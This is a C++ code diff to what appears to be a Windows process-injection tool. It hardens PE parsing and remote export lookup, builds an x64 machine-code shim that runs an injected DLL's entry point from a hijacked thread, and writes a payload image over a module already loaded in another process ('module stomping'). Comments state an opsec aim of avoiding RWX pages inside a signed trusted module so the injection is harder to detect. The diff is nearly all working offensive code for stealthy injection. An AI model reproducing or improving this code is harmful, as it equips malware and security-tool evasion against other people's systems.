@@ -5,6 +5,7 @@
 
 #include <winternl.h>
 #include <psapi.h>
+#include <tlhelp32.h>
 #include <algorithm>
 #include <cstring>
 #include <string>
@@ -34,9 +35,25 @@ bool ParsePE(const std::vector<std::uint8_t>& bytes, Img& out) {
     out.raw = bytes.data();
     out.dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(out.raw);
     if (out.dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
+    if (out.dos->e_lfanew < 0 ||
+        static_cast<size_t>(out.dos->e_lfanew) + sizeof(IMAGE_NT_HEADERS64) > bytes.size())
+        return false;
     out.nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(out.raw + out.dos->e_lfanew);
-    return out.nt->Signature == IMAGE_NT_SIGNATURE &&
-           out.nt->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64;
+    if (out.nt->Signature != IMAGE_NT_SIGNATURE) return false;
+    if (out.nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return false;
+    if (out.nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return false;
+    const size_t secTblOff = static_cast<size_t>(out.dos->e_lfanew)
+        + offsetof(IMAGE_NT_HEADERS64, OptionalHeader)
+        + out.nt->FileHeader.SizeOfOptionalHeader;
+    const size_t secBytes  = static_cast<size_t>(out.nt->FileHeader.NumberOfSections)
+                             * sizeof(IMAGE_SECTION_HEADER);
+    if (secTblOff + secBytes > bytes.size()) return false;
+    auto* sec = reinterpret_cast<const IMAGE_SECTION_HEADER*>(out.raw + secTblOff);
+    for (WORD i = 0; i < out.nt->FileHeader.NumberOfSections; ++i) {
+        if (static_cast<size_t>(sec[i].PointerToRawData) + sec[i].SizeOfRawData > bytes.size())
+            return false;
+    }
+    return true;
 }
 
 DWORD SectionProt(DWORD c) {
@@ -177,33 +194,36 @@ void ApplyRelocs(std::uint8_t* buf, const IMAGE_NT_HEADERS64* nt, std::intptr_t 
 }
 
 std::uintptr_t RemoteExport(HANDLE proc, std::uintptr_t remoteBase, const char* name) {
+    auto rpm = [&](std::uintptr_t at, void* dst, size_t sz) {
+        return ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(at), dst, sz, nullptr) != 0;
+    };
     IMAGE_DOS_HEADER dos{};
-    if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(remoteBase),
-                           &dos, sizeof(dos), nullptr) ||
-        dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;
+    if (!rpm(remoteBase, &dos, sizeof(dos))) return 0;
+    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;
     IMAGE_NT_HEADERS64 nt{};
-    if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(remoteBase + dos.e_lfanew),
-                           &nt, sizeof(nt), nullptr)) return 0;
+    if (!rpm(remoteBase + dos.e_lfanew, &nt, sizeof(nt))) return 0;
     auto& dir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-    if (!dir.VirtualAddress) return 0;
+    if (!dir.VirtualAddress || !dir.Size) return 0;
     std::vector<std::uint8_t> buf(dir.Size);
-    if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(remoteBase + dir.VirtualAddress),
-                           buf.data(), dir.Size, nullptr)) return 0;
+    if (!rpm(remoteBase + dir.VirtualAddress, buf.data(), dir.Size)) return 0;
     auto* ex = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(buf.data());
     std::vector<DWORD> names(ex->NumberOfNames);
     std::vector<WORD>  ords (ex->NumberOfNames);
     std::vector<DWORD> funcs(ex->NumberOfFunctions);
-    ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(remoteBase + ex->AddressOfNames),
-                      names.data(), names.size()*4, nullptr);
-    ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(remoteBase + ex->AddressOfNameOrdinals),
-                      ords.data(),  ords.size()*2, nullptr);
-    ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(remoteBase + ex->AddressOfFunctions),
-                      funcs.data(), funcs.size()*4, nullptr);
+    if (ex->NumberOfNames &&
+        !rpm(remoteBase + ex->AddressOfNames,        names.data(), names.size()*4)) return 0;
+    if (ex->NumberOfNames &&
+        !rpm(remoteBase + ex->AddressOfNameOrdinals, ords.data(),  ords.size()*2))  return 0;
+    if (ex->NumberOfFunctions &&
+        !rpm(remoteBase + ex->AddressOfFunctions,    funcs.data(), funcs.size()*4)) return 0;
+    const DWORD edStart = dir.VirtualAddress, edEnd = dir.VirtualAddress + dir.Size;
     for (DWORD i = 0; i < ex->NumberOfNames; ++i) {
         char n[256]{};
-        if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(remoteBase + names[i]),
-                               n, sizeof(n)-1, nullptr)) continue;
-        if (std::strcmp(n, name) == 0) return remoteBase + funcs[ords[i]];
+        if (!rpm(remoteBase + names[i], n, sizeof(n)-1)) return 0;
+        if (std::strcmp(n, name) != 0) continue;
+        const DWORD rva = funcs[ords[i]];
+        if (rva >= edStart && rva < edEnd) return 0; // forwarder
+        return remoteBase + rva;
     }
     return 0;
 }
@@ -270,44 +290,105 @@ std::uintptr_t FindExport(const std::uint8_t* local, const IMAGE_NT_HEADERS64* n
     return 0;
 }
 
-struct ShimLayout { std::uint8_t bytes[0x80]; std::size_t size; };
+struct ShimLayout { std::uint8_t bytes[0x100]; std::size_t size; };
 ShimLayout BuildShim(std::uintptr_t base, std::uintptr_t entry, std::uintptr_t savedRip) {
+    // Mirror of manual_map.cpp BuildShim: full volatile + XMM + flags save,
+    // 16-byte stack realign, RIP-relative absolute jmp back (no GPR clobber).
     ShimLayout sl{};
     std::uint8_t* p = sl.bytes;
-    auto emit8  = [&](std::uint8_t  v) { *p++ = v; };
+    auto emit  = [&](std::initializer_list<std::uint8_t> xs) {
+        for (auto b : xs) *p++ = b;
+    };
     auto emit64 = [&](std::uint64_t v) { std::memcpy(p, &v, 8); p += 8; };
-    emit8(0x48); emit8(0x83); emit8(0xEC); emit8(0x28);
-    emit8(0x48); emit8(0xB9); emit64((std::uint64_t)base);
-    emit8(0x48); emit8(0xC7); emit8(0xC2); emit8(1); emit8(0); emit8(0); emit8(0);
-    emit8(0x4D); emit8(0x31); emit8(0xC0);
-    emit8(0x48); emit8(0xB8); emit64((std::uint64_t)entry);
-    emit8(0xFF); emit8(0xD0);
-    emit8(0x48); emit8(0x83); emit8(0xC4); emit8(0x28);
-    emit8(0x48); emit8(0xB8); emit64((std::uint64_t)savedRip);
-    emit8(0xFF); emit8(0xE0);
+
+    emit({0x55});                                       // push rbp
+    emit({0x9C});                                       // pushfq
+    emit({0x50});                                       // push rax
+    emit({0x51});                                       // push rcx
+    emit({0x52});                                       // push rdx
+    emit({0x41, 0x50});                                 // push r8
+    emit({0x41, 0x51});                                 // push r9
+    emit({0x41, 0x52});                                 // push r10
+    emit({0x41, 0x53});                                 // push r11
+    emit({0x48, 0x83, 0xEC, 0x60});                     // sub rsp, 0x60
+    emit({0xF3, 0x0F, 0x7F, 0x04, 0x24});
+    emit({0xF3, 0x0F, 0x7F, 0x4C, 0x24, 0x10});
+    emit({0xF3, 0x0F, 0x7F, 0x54, 0x24, 0x20});
+    emit({0xF3, 0x0F, 0x7F, 0x5C, 0x24, 0x30});
+    emit({0xF3, 0x0F, 0x7F, 0x64, 0x24, 0x40});
+    emit({0xF3, 0x0F, 0x7F, 0x6C, 0x24, 0x50});
+    emit({0x48, 0x89, 0xE5});                           // mov rbp, rsp
+    emit({0x48, 0x83, 0xE4, 0xF0});                     // and rsp, -16
+    emit({0x48, 0x83, 0xEC, 0x20});                     // sub rsp, 0x20
+    emit({0x48, 0xB9}); emit64((std::uint64_t)base);    // mov rcx, imm64
+    emit({0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00});   // mov rdx, 1
+    emit({0x4D, 0x31, 0xC0});                           // xor r8, r8
+    emit({0x48, 0xB8}); emit64((std::uint64_t)entry);   // mov rax, imm64
+    emit({0xFF, 0xD0});                                 // call rax
+    emit({0x48, 0x89, 0xEC});                           // mov rsp, rbp
+    emit({0xF3, 0x0F, 0x6F, 0x04, 0x24});
+    emit({0xF3, 0x0F, 0x6F, 0x4C, 0x24, 0x10});
+    emit({0xF3, 0x0F, 0x6F, 0x54, 0x24, 0x20});
+    emit({0xF3, 0x0F, 0x6F, 0x5C, 0x24, 0x30});
+    emit({0xF3, 0x0F, 0x6F, 0x64, 0x24, 0x40});
+    emit({0xF3, 0x0F, 0x6F, 0x6C, 0x24, 0x50});
+    emit({0x48, 0x83, 0xC4, 0x60});                     // add rsp, 0x60
+    emit({0x41, 0x5B}); emit({0x41, 0x5A});             // pop r11; pop r10
+    emit({0x41, 0x59}); emit({0x41, 0x58});             // pop r9; pop r8
+    emit({0x5A}); emit({0x59}); emit({0x58});           // pop rdx; pop rcx; pop rax
+    emit({0x9D});                                       // popfq
+    emit({0x5D});                                       // pop rbp
+    emit({0xFF, 0x25, 0x00, 0x00, 0x00, 0x00});         // jmp qword ptr [rip+0]
+    emit64((std::uint64_t)savedRip);
+
     sl.size = (std::size_t)(p - sl.bytes);
     return sl;
 }
 
 HANDLE OpenHijackableThread(DWORD pid, DWORD& outTid) {
+    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+    MODULEINFO mi{};
+    GetModuleInformation(GetCurrentProcess(), ntdll, &mi, sizeof(mi));
+    const auto ntBase = reinterpret_cast<std::uintptr_t>(mi.lpBaseOfDll);
+    const auto ntEnd  = ntBase + mi.SizeOfImage;
+
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
     if (snap == INVALID_HANDLE_VALUE) return nullptr;
+
+    struct Candidate { DWORD tid; HANDLE handle; };
+    std::vector<Candidate> cands;
     THREADENTRY32 te{ sizeof(te) };
-    HANDLE best = nullptr; DWORD bestTid = 0;
     if (Thread32First(snap, &te)) do {
         if (te.th32OwnerProcessID != pid) continue;
         HANDLE h = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT |
                               THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION,
                               FALSE, te.th32ThreadID);
-        if (!h) continue;
-        if (!best || te.th32ThreadID < bestTid) {
-            if (best) CloseHandle(best);
-            best = h; bestTid = te.th32ThreadID;
-        } else CloseHandle(h);
+        if (h) cands.push_back({ te.th32ThreadID, h });
     } while (Thread32Next(snap, &te));
     CloseHandle(snap);
-    outTid = bestTid;
-    return best;
+
+    std::sort(cands.begin(), cands.end(),
+              [](const Candidate& a, const Candidate& b) { return a.tid < b.tid; });
+
+    HANDLE winner = nullptr; DWORD winnerTid = 0;
+    for (auto& c : cands) {
+        if (winner) continue;
+        if (SuspendThread(c.handle) == (DWORD)-1) continue;
+        CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_CONTROL;
+        bool ok = GetThreadContext(c.handle, &ctx) != 0;
+        ResumeThread(c.handle);
+        if (!ok) continue;
+        const auto rip = static_cast<std::uintptr_t>(ctx.Rip);
+        if (rip >= ntBase && rip < ntEnd) continue; // parked in ntdll
+        winner = c.handle;
+        winnerTid = c.tid;
+        c.handle = nullptr; // mark claimed so cleanup loop doesn't double-close
+    }
+    // Close every candidate we didn't claim. Clearing `c.handle = nullptr`
+    // above prevents the double-close the audit flagged.
+    for (auto& c : cands) if (c.handle) CloseHandle(c.handle);
+    outTid = winnerTid;
+    return winner;
 }
 
 } // namespace
@@ -372,24 +453,44 @@ mapper::Result InjectStomp(DWORD pid,
         return { false, "imports", "IAT resolution failed", 0 };
     }
 
-    // Flip stomped pages to RW first (they are RX), write, flip back per section.
-    DWORD oldPage;
-    VirtualProtectEx(proc, reinterpret_cast<LPVOID>(stompBase),
-                     imgSize, PAGE_EXECUTE_READWRITE, &oldPage);
-    if (!WriteProcessMemory(proc, reinterpret_cast<LPVOID>(stompBase),
-                            local.data(), imgSize, nullptr)) {
-        VirtualProtectEx(proc, reinterpret_cast<LPVOID>(stompBase),
-                         imgSize, oldPage, &oldPage);
-        CloseHandle(proc);
-        return { false, "write", "WriteProcessMemory failed", 0 };
-    }
+    // Per-section flip-write-restore. We NEVER do a blanket imgSize-wide
+    // RWX flip anymore — the audit flagged that as leaving inter-section
+    // gap pages (part of the stomped module's original .text/.rdata) in
+    // RWX inside a signed trusted module, defeating the §6.7 opsec goal.
+    // The headers region at the stomp base and each section's VA..VA+VS
+    // range get flipped individually; everything else keeps the module's
+    // original protection.
+    auto flipWriteRestore = [&](std::uintptr_t at, DWORD size,
+                                const void* src, DWORD finalProt) -> bool {
+        if (!size) return true;
+        DWORD saved = 0;
+        if (!VirtualProtectEx(proc, reinterpret_cast<LPVOID>(at), size,
+                              PAGE_EXECUTE_READWRITE, &saved)) return false;
+        const bool wrote = WriteProcessMemory(proc, reinterpret_cast<LPVOID>(at),
+                                              src, size, nullptr) != 0;
+        DWORD tmp = 0;
+        VirtualProtectEx(proc, reinterpret_cast<LPVOID>(at), size, finalProt, &tmp);
+        return wrote;
+    };
 
+    // Headers window first. SizeOfHeaders is page-sized by the loader; we
+    // write it then flip to R (we'll zero it in the EraseHeaders path).
+    if (!flipWriteRestore(stompBase,
+                          img.nt->OptionalHeader.SizeOfHeaders,
+                          local.data(),
+                          PAGE_READONLY)) {
+        CloseHandle(proc);
+        return { false, "write", "WriteProcessMemory (headers) failed", 0 };
+    }
     for (WORD i = 0; i < img.nt->FileHeader.NumberOfSections; ++i) {
-        DWORD prot = SectionProt(sec[i].Characteristics);
-        DWORD old = 0;
-        VirtualProtectEx(proc,
-            reinterpret_cast<LPVOID>(stompBase + sec[i].VirtualAddress),
-            (std::max<DWORD>)(sec[i].Misc.VirtualSize, 1), prot, &old);
+        const DWORD vs = (std::max<DWORD>)(sec[i].Misc.VirtualSize, 1);
+        if (!flipWriteRestore(stompBase + sec[i].VirtualAddress,
+                              vs,
+                              local.data() + sec[i].VirtualAddress,
+                              SectionProt(sec[i].Characteristics))) {
+            CloseHandle(proc);
+            return { false, "write", "WriteProcessMemory (section) failed", 0 };
+        }
     }
 
     std::uintptr_t entry = FindExport(local.data(),
